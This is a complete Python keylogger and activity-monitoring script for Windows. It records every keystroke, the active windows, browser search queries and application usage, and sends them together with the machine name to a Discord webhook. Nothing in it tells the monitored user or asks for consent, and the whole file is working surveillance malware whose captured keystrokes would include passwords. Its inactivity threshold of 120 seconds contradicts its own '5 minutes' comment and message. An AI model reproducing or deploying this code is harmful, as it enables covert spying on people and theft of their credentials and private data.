import psutil
import requests
import time
import win32gui
import win32process
import re
import socket
import keyboard
from datetime import datetime

# Discord Webhook URL
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"

# Get PC name
PC_NAME = socket.gethostname()

# Store last logged application and its start time to track duration
last_logged = None
app_start_times = {}
active_processes = set()
last_activity_time = time.time()
INACTIVITY_THRESHOLD = 120  # 5 minutes
keystrokes = ""

# Function to format duration
def format_duration(seconds):
    if seconds < 60:
        return f"{seconds:.2f} seconds"
    elif seconds < 3600:
        minutes = seconds // 60
        seconds = seconds % 60
        return f"{int(minutes)} minutes {seconds:.2f} seconds"
    else:
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60
        seconds = (seconds % 3600) % 60
        return f"{int(hours)} hours {int(minutes)} minutes {seconds:.2f} seconds"

# Function to get active window title
def get_active_window_title():
    hwnd = win32gui.GetForegroundWindow()
    _, pid = win32process.GetWindowThreadProcessId(hwnd)
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['pid'] == pid:
            return proc.info['name'], win32gui.GetWindowText(hwnd), hwnd
    return None, None, None

# Function to extract search query from browser titles
def extract_search_query(title):
    search_patterns = [
        r' - Google Search',
        r' - Bing',
        r' - Yahoo Search',
        r' - DuckDuckGo',
        r' - Ecosia',
    ]
    
    for pattern in search_patterns:
        if re.search(pattern, title):
            return re.sub(pattern, '', title)
    return None

# Function to send logs to Discord
def send_to_discord(message):
    payload = {"content": message}
    requests.post(WEBHOOK_URL, json=payload)

# Function to log keystrokes
def log_keystroke(event):
    global keystrokes
    keystrokes += event.name if len(event.name) == 1 else f' [{event.name}] '
    if len(keystrokes) > 50:
        send_to_discord(f"[Keystrokes] {PC_NAME}: {keystrokes}")
        keystrokes = ""

keyboard.on_press(log_keystroke)

# Monitoring loop
def monitor():
    global last_logged, active_processes, app_start_times, last_activity_time
    minimized_windows = set()
    
    while True:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        app_name, window_title, hwnd = get_active_window_title()
        current_processes = {proc.info['name'] for proc in psutil.process_iter(['name'])}
        closed_processes = active_processes - current_processes

        # Detect closed applications
        for closed_app in closed_processes:
            if closed_app in app_start_times:
                duration = time.time() - app_start_times.pop(closed_app)
                close_message = f"[{timestamp}] {PC_NAME} - User closed {closed_app} after {format_duration(duration)}"
                send_to_discord(close_message)

        active_processes = current_processes

        if app_name:
            last_activity_time = time.time()
            if (app_name, window_title) != last_logged:
                if last_logged and last_logged[0] in app_start_times:
                    duration = time.time() - app_start_times[last_logged[0]]
                    switch_message = f"[{timestamp}] {PC_NAME} - User switched from {last_logged[0]} to {app_name} after {format_duration(duration)}"
                    send_to_discord(switch_message)
                
                # Check if the application was already running or newly opened
                if app_name not in app_start_times:
                    log_message = f"[{timestamp}] {PC_NAME} - User opened {app_name}: {window_title}"
                    app_start_times[app_name] = time.time()
                else:
                    log_message = f"[{timestamp}] {PC_NAME} - User switched to {app_name}: {window_title}"
                
                if app_name in ["chrome.exe", "firefox.exe", "msedge.exe", "opera.exe", "brave.exe"]:
                    search_query = extract_search_query(window_title)
                    if search_query:
                        log_message = f"[{timestamp}] {PC_NAME} - User searched: {search_query}"
                
                send_to_discord(log_message)
                last_logged = (app_name, window_title)

        # Detect minimized applications
        if hwnd and win32gui.IsIconic(hwnd):
            if app_name not in minimized_windows:
                minimize_message = f"[{timestamp}] {PC_NAME} - User minimized {app_name}"
                send_to_discord(minimize_message)
                minimized_windows.add(app_name)
        elif app_name in minimized_windows:
            minimized_windows.remove(app_name)

        # Check for inactivity
        if time.time() - last_activity_time > INACTIVITY_THRESHOLD:
            inactivity_message = f"[{timestamp}] {PC_NAME} - User inactive for more than 5 minutes"
            send_to_discord(inactivity_message)
            last_activity_time = time.time()  # Reset inactivity timer
        
        time.sleep(2)  # Reduced sleep for near real-time logging

if __name__ == "__main__":
    monitor()
